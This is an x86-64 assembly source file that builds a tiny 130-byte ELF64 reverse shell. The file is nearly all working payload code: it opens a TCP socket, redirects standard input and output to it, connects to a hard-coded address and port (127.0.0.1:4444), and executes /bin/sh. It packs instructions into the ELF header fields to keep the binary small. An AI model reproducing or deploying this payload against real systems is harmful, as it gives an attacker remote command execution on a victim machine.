;; Tiny 130-byte ELF64 Reverse Shell
;;
;; endofunky <ebbg (ng) shmmrq.bet>
;; CDED A55D 6EEE FE1B 6510 D6A4 510F 3BD0 0000 DEAD
bits 64
org 0x1000

%define sockaddr(ip1, ip2, ip3, ip4, port, family) \
        ip4 << 56 | ip3 << 48 | ip2 << 40 | ip1 << 32 | \
        (port & 0xFF) << 24 | (port >> 8 & 0xFF) << 16 | \
        family

        db 0x7F, "ELF"          ; e_ident
_start:                         ;
        mov ax, 0x167           ; SYS_socket
        mov bl, 2               ; 2 = PF_INET
        mov cl, 1               ; 1 = SOCK_STREAM
        int 0x80                ;
        jmp short j1            ; ------------.
        dw  2                   ; e_type      |
        dw  62                  ; e_machine   |
        dd  1                   ; e_version   |
        dq  _start              ; e_entry     |
        dq  phdr-$$             ; e_phoff     |
j1:                             ; <-----------'
        xchg ebx, eax           ; fd into ebx, 2 (PF_INET) into eax
        xchg ecx, eax           ; 2 (PF_INET) into ecx, used as loop counter
.l:                             ; <---------------------------------------.
        mov al, 0x3f            ; SYS_dup2 early so connect to fd 0 works |
        int 0x80                ;                                         |
        dec cl                  ; decrement counter                       |
        jns short .l            ; loop from 2 to 0 -----------------------'
        mov al, 0x2a            ; SYS_connect, fd in rdi is 0
        jmp short j2            ; ---------------.
        dw  0x38                ; e_phentsize    |
phdr:                           ;                |
        dd  1                   ; p_type         |
        dd  5                   ; p_flags        |
        dq  0                   ; p_offset       |
        dq  $$                  ; p_vaddr        |
sockaddr: dq sockaddr(127, 0, 0, 1, 4444, 2) ;   |
        dq  filesize            ; p_filesz       |
        dq  filesize            ; p_memsz        |
j2:                             ; <--------------'
        mov si, sockaddr        ; sockaddr*
        mov dl, 0x10            ; socklen_t
        syscall                 ; fd 0 from ret val of prev syscall
        mov al, 0x0b            ; SYS_execve
        lea ebx, [rcx-($-cmd-2)]; *pathname - calc from ret addr of prev syscall
        xor ecx, ecx            ; argv = NULL
        cdq                     ; envp = NULL
        int 0x80                ;
cmd: db "/bin/sh", 0            ; 8 bytes max + NULL terminator
filesize: equ $-$$
